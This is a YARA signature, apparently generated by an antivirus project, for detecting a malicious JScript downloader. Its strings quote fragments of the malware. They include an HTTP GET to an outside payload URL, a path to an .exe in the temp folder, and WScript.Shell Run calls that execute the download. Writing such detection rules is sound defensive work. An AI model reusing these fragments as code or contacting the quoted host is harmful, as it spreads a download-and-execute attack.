rule sig_20160328_cedc71a6a40ad144c437de7b35c2562a {
  meta:
    description = "datamaliciousorder - file 20160328_cedc71a6a40ad144c437de7b35c2562a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d1afbf101aa5aa8ae5522c7f8e7b2df557e2776662044d0d839635f102458dd9"

  strings:
    $s1  = "function Yvehto() {return Rxhmpriup[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pU7oIQs7X8zfugC.exe\";};" fullword ascii
    $s2  = "Grbbff[Pcuyydjz](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Pgpgvtlk](Hwiyifm() * 11)} while (Grbbff[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Wjxnzwd(Toqthz, Yxeydfq){return Toqthz - Yxeydfq;};" fullword ascii
    $s5  = "var Rxhmpriup = function Mpefgmbnpv() {return WScript[Kcoaffpw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "var Ecrntpxjah = false;" fullword ascii
    $s7  = "function Uerrydkxnu(){return Kcoaffpw;};" fullword ascii
    $s8  = "function Djxdsgr(){return Biitz;};" fullword ascii
    $s9  = "var Dslqo = false;" fullword ascii
    $s10 = "return Wjxnzwd(Mgqsppeead, Wgdupvqur);" fullword ascii
    $s11 = "Dslqo = true; " fullword ascii
    $s12 = "function Hwiyifm(){return 22;};" fullword ascii
    $s13 = "var Lcyrmy = new this[\"Date\"]();" fullword ascii
    $s14 = "Nmvwpcnzw = true; " fullword ascii
    $s15 = "function Fojifqnvii(Mnriq) {var Txmnka = (1, 2, 3, 4, 5, Mnriq); return Txmnka;};" fullword ascii
    $s16 = " while (Vhskld){" fullword ascii
    $s17 = "function Ubzlvvpek()" fullword ascii
    $s18 = "var Nmvwpcnzw = false;" fullword ascii
    $s19 = "function Jccisb(Fgkjy){Rxhmpriup[\"Run\"](Fgkjy, Gcaipd, Gcaipd);};" fullword ascii
    $s20 = "function Edkoigblm() {return ((Nmvwpcnzw == true) && (Nmvwpcnzw == Dslqo)) ? 1 : Gcaipd;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}